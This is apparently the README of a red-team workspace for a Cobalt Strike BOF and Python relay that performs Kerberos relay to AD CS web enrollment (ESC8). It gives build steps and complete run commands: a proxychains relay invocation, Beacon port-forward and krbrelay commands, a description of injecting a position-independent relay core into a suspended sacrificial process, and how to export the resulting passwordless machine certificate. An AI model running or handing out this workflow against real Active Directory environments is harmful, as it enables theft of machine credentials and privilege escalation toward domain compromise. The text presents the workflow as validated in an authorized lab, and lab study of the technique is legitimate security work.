# KrbRelay BOF to Kerberos-only ESC8

This workspace contains the certificate-only split validated in the authorized
Ludus lab:

1. The x64 BOF registers the same COM/RPC relay used by KrbRelayUp and forces
   the selected privileged COM service to authenticate as the machine named at
   runtime.
2. The BOF binds to one Python invocation with a 256-bit run nonce, then
   exchanges complete DCE/RPC SPNEGO blobs using the documented `KRB1` framing.
3. Python relays each leg on one TCP connection to the Kerberos-only IIS site,
   then enrolls the template named at runtime on that authenticated connection.
4. Python verifies that the certificate public key matches its in-memory RSA
   private key and that the certificate has the client-authentication EKU.

The workflow intentionally ends at the usable certificate/key pair. It has no
PKINIT, S4U, ticket import, service creation, or credential-extraction stage.
Raw authentication material is printed only when the corresponding trace or
export option is used.

## Build

The Makefile expects a MinGW package tree at `/tmp/krb-mingw-root`:

```sh
make
make verify
```

With a system MinGW install, override `MINGW_PREFIX` and the Makefile compiler
paths as appropriate.

## Run

All deployment-specific values are supplied at runtime; neither the BOF nor
the relay contains a built-in lab address, hostname, endpoint, or port.

Terminal 1 on the Cobalt Strike client. Proxychains is used only for the
relay's outbound ADCS connection; the listener and allowed-peer addresses
default to loopback:

```sh
proxychains4 /home/kali/Tools/Certipy/.venv/bin/python relay/relay_server.py \
  --port RELAY_PORT \
  --adcs-address ADCS_ADDRESS --adcs-host ADCS_HOST --adcs-port ADCS_PORT \
  --domain DOMAIN --machine MACHINE --template TEMPLATE \
  --trace-spnego --export-pfx-b64 --pfx-out MACHINE-machine.pfx
```

Python generates and prints a fresh run nonce when `--run-nonce` is omitted.
Copy the printed nonce into the matching Beacon command. To preselect it, pass
the same 64 hexadecimal characters with `--run-nonce`.

Beacon commands:

```text
rportfwd_local RELAY_PORT 127.0.0.1 RELAY_PORT
krbrelay SACRIFICIAL_PROCESS RELAY_PORT http/ADCS_HOST RPC_PORT RUN_NONCE
```

The reverse forward binds the relay port on target loopback. The BOF starts the
caller-selected image suspended, injects one self-resolving 17 KB raw-PIC
relay core and its parameter block with direct Win32 calls, runs the original
KrbRelayUp COM path in that clean process, collects diagnostics, and terminates
the image. There is no target file, PE/DLL mapping, sRDI layer, nested COFF
loader, Cobalt spawn/inject API, OXID service, or target TCP-135 callback.

The Cobalt command exposes the process command line, relay port, service SPN,
and target-local RPC endpoint. The relay address and RPC binding address are
fixed to loopback by the CNA, and the known-good trigger CLSID is internal.

The helper constrains Negotiate to the supplied SPN and relays only Kerberos
SPNEGO records to IIS. It exits as soon as Python confirms that IIS authenticated
the persistent connection; Python then completes enrollment independently. A
60-second watchdog protects only the target-side COM/authentication operation.

The Python functions `run_session()` and `enroll()` also return a
`CertificateBundle` for an in-process follow-on consumer. Without
`--export-pfx-b64`, the standalone command validates the bundle and releases it
on exit.

See `docs/protocol.md` for the bridge format.

`--trace-spnego` prints each complete SPNEGO record and contextual metadata.
`--export-pfx-b64` prints a `PFX_B64=` line containing a passwordless PKCS#12
bundle. Copy the characters following `PFX_B64=` and decode them with:

```sh
printf '%s' 'BASE64_VALUE_HERE' | base64 -d > WIN11-01-machine.pfx
```

`--pfx-out WIN11-01-machine.pfx` writes that same bundle directly with file
mode `0600`.

These options output authentication material and should be omitted when only
non-sensitive validation is desired.

## Design reference

James Forshaw's Project Zero article, [Windows Exploitation Tricks: Relaying
DCOM Authentication](https://projectzero.google/2021/10/windows-exploitation-tricks-relaying.html),
documents the OBJREF/OXID, COM unmarshalling, security-binding, and multi-leg
DCE/RPC authentication behavior on which this design is based.
